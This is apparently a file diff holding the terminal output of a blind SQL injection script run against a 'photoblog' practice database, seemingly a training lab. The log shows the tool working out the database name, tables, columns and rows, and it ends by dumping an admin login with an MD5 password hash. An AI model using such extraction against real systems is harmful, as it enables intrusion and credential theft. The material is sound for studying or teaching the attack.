@@ -1,0 +1,142 @@
+➜ python3 BlindSQLI.py
+LenOFDbName = 9
++-----------------+
+| Database Name   |
++=================+
+| photoblog       |
++-----------------+ 
+
+NumOfTablesInDB = 11
+LenOfTableName #1 = 10
+NumOfColInTable(categories) = 2
+NumOfRowInTable(categories) = 3
+LenOfTableName #2 = 10
+NumOfColInTable(categories) = 2
+NumOfRowInTable(categories) = 3
+LenOfTableName #3 = 8
+NumOfColInTable(pictures) = 4
+NumOfRowInTable(pictures) = 3
+LenOfTableName #4 = 8
+NumOfColInTable(pictures) = 4
+NumOfRowInTable(pictures) = 3
+LenOfTableName #5 = 8
+NumOfColInTable(pictures) = 4
+NumOfRowInTable(pictures) = 3
+LenOfTableName #6 = 8
+NumOfColInTable(pictures) = 4
+NumOfRowInTable(pictures) = 3
+LenOfTableName #7 = 5
+NumOfColInTable(stats) = 2
+NumOfRowInTable(stats) = 1
+LenOfTableName #8 = 5
+NumOfColInTable(stats) = 2
+NumOfRowInTable(stats) = 1
+LenOfTableName #9 = 5
+NumOfColInTable(users) = 3
+NumOfRowInTable(users) = 1
+LenOfTableName #10 = 5
+NumOfColInTable(users) = 3
+NumOfRowInTable(users) = 1
+LenOfTableName #11 = 5
+NumOfColInTable(users) = 3
+NumOfRowInTable(users) = 1
+Tables Info
+TableName : categories
++-------------+-------------+
+|   NumOfCols |   NumOfRows |
++=============+=============+
+|           2 |           3 |
++-------------+-------------+ 
+
+TableName : pictures
++-------------+-------------+
+|   NumOfCols |   NumOfRows |
++=============+=============+
+|           4 |           3 |
++-------------+-------------+ 
+
+TableName : stats
++-------------+-------------+
+|   NumOfCols |   NumOfRows |
++=============+=============+
+|           2 |           1 |
++-------------+-------------+ 
+
+TableName : users
++-------------+-------------+
+|   NumOfCols |   NumOfRows |
++=============+=============+
+|           3 |           1 |
++-------------+-------------+ 
+
+LenOfColName #1 Of(categories) = 2
+LenOfColName #2 Of(categories) = 5
+LenOfColName #1 Of(pictures) = 2
+LenOfColName #2 Of(pictures) = 5
+LenOfColName #3 Of(pictures) = 3
+LenOfColName #4 Of(pictures) = 3
+LenOfColName #1 Of(stats) = 2
+LenOfColName #2 Of(stats) = 5
+LenOfColName #1 Of(users) = 2
+LenOfColName #2 Of(users) = 5
+LenOfColName #3 Of(users) = 8
+Tables Info
+ColumnsOfTable(categories)
+--  -----
+id  title
+--  ----- 
+
+ColumnsOfTable(pictures)
+--  -----  ---  ---
+id  title  img  cat
+--  -----  ---  --- 
+
+ColumnsOfTable(stats)
+--  -----
+ip  count
+--  ----- 
+
+ColumnsOfTable(users)
+--  -----  --------
+id  login  password
+--  -----  -------- 
+
+LenOfDataOfRow #1 Of(categories) = 8
+LenOfDataOfRow #2 Of(categories) = 10
+LenOfDataOfRow #3 Of(categories) = 8
++------+---------+
+|   id | title   |
++======+=========+
+|    1 | test    |
++------+---------+
+|    2 | ruxcon  |
++------+---------+
+|    3 | 2010    |
++------+---------+ 
+
+LenOfDataOfRow #1 Of(pictures) = 27
+LenOfDataOfRow #2 Of(pictures) = 23
+LenOfDataOfRow #3 Of(pictures) = 29
++------+---------+-------------+-------+
+|   id | title   | img         |   cat |
++======+=========+=============+=======+
+|    1 | acker   | hacker.png  |     2 |
++------+---------+-------------+-------+
+|    2 | uby     | ruby.jpg    |     1 |
++------+---------+-------------+-------+
+|    3 | thulhu  | cthulhu.png |     1 |
++------+---------+-------------+-------+ 
+
+LenOfDataOfRow #1 Of(stats) = 17
++---------------+---------+
+| ip            |   count |
++===============+=========+
+| 192.168.1.154 |       2 |
++---------------+---------+ 
+
+LenOfDataOfRow #1 Of(users) = 44
++------+---------+----------------------------------+
+|   id | login   | password                         |
++======+=========+==================================+
+|    1 | admin   | 8efe310f9ab3efeae8d410a8e0166eb2 |   # md5 hashed
++------+---------+----------------------------------+ 
